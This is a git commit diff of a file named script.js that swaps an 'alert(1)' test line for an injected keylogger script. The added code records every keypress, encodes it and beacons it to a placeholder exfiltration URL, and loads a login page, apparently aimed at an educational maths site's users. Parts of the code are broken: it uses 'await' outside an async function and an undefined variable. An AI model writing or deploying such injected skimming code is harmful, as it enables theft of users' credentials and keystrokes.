235e87b07a3ec03c2b4addec85eb56b4960c0023
soesam <67687007+soesam@users.noreply.github.com>
2020-07-08 20:16:28 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,17 @@
-alert(1)
+(function() {
+  const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
+  const bin = 'https://???/bin?data='
+
+  const load = path => document.write(
+    await fetch(path)
+    .then(r => r.text())
+  )
+
+  const log = data => {
+    new Image()
+    .src = `${bin}${btoa(JSON.stringify(data))}`
+  }
+  
+  document.onkeydown = ({key}) => log(key)
+  load(`/login.php?url=${encodeURIComponent(after)}`)
+})()
